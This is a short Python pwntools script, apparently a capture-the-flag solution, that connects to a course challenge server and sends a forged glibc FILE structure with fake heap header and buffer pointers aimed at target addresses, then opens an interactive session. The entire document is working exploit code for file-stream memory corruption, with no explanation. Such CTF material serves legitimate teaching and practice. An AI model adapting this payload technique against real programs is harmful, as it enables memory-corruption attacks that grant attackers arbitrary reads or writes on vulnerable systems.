from pwn import *

r = remote("edu-ctf.zoolab.org", 10009)

owo = 0x404070
flag = 0x404060

data = b"A" * 0x10
data += p64(0) + p64(0x1e1)  # heap header
data += p64(0xfbad0000)      # flags
data += p64(0)               # read_ptr
data += p64(0)               # read_end
data += p64(0)               # read_base
data += p64(owo)             # write_base
data += p64(0)               # write_ptr
data += p64(0)               # write_end
data += p64(owo)             # buf_base
data += p64(owo + 0x10)      # buf_end
data += p64(0) * 5           # others
data += b"\x00"              # fileno

r.send(data)
r.interactive()